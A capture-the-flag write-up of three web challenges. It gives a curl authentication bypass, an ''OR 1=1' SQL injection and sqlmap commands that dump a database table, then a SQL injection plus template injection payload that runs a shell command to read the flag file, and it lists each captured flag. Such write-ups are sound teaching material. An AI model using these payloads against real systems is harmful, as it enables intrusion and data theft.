# Patriot CTF Web Writeups
### Most of these chals were very easy so I won't spend too much time in the writeup explaining it as it is very self-explanatory.


## Secure Auth
<img width="520" height="541" alt="image" src="https://github.com/user-attachments/assets/0d1cecba-5cb4-44be-9520-5adf8f5594eb" />

```
curl -X POST http://18.212.136.134:5200/api/authenticate \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"","remember":true}'

```

<img width="646" height="165" alt="image" src="https://github.com/user-attachments/assets/1bed7b88-b36e-45fe-9577-ce5024fbce24" />

flag: `FLAG{py7h0n_typ3_c03rc10n_byp4ss}`
 
---

## Connection Tester

<img width="506" height="494" alt="image" src="https://github.com/user-attachments/assets/ae9935f3-fd0a-4dd5-9e77-4947ea45cbe1" />

After some manual testing I found I could login via `'OR 1=1-- -` and was able to get in... so this is easy sqli problem.

<img width="661" height="358" alt="image" src="https://github.com/user-attachments/assets/5db44e56-6071-43cb-b453-29dc9219b1a2" />

Then I have some connectivity tool, **but this connectivity tool doesn't do anything. we need so this hinted at blind SQLI to dump the db**

<img width="661" height="358" alt="image" src="https://github.com/user-attachments/assets/026601ff-0e91-4fca-8e16-7c572bfa1a0a" />



Use SQL map:

```
sqlmap -u "http://18.212.136.134:9080/login" \
       --data="username=admin&password=test" \
       --technique=B \
       --level=5 \
       --risk=3 \
       --tables \
       --batch
```

<img width="394" height="186" alt="image" src="https://github.com/user-attachments/assets/5198bbdf-d9e1-4abc-9300-06cbe2e8af83" />


We get 3 tables: `users`, `sqlite_sequence`, and `flags`.

Lets dump the `flags` table: and look  what we found:

```
sqlmap -u "http://18.212.136.134:9080/login" \
       --data="username=admin&password=test" \
       --technique=B \
       -T flags \
       --dump \
       --batch
```

<img width="1084" height="369" alt="image" src="https://github.com/user-attachments/assets/e5c43757-1f05-410b-9250-eaba047f5a9a" />


flag: `PCTF{C0nn3cti0n_S3cured}`

---
## Trust Vault
<img width="510" height="483" alt="image" src="https://github.com/user-attachments/assets/f102d538-2b15-4fdb-9472-c86bdb3e5f8a" />


Hinted at an endpoint called `/search`

<img width="565" height="309" alt="image" src="https://github.com/user-attachments/assets/dc082595-8cff-4647-8834-3a70e47e3f4b" />

did as the chal descriptopn asked: SQLI + template injection

`' UNION SELECT '{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag*").read()}}' --`

<img width="1610" height="546" alt="Screenshot from 2025-11-22 17-04-42" src="https://github.com/user-attachments/assets/4d069a77-3175-497e-a12a-c65235e9874a" />


flag: `PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}`
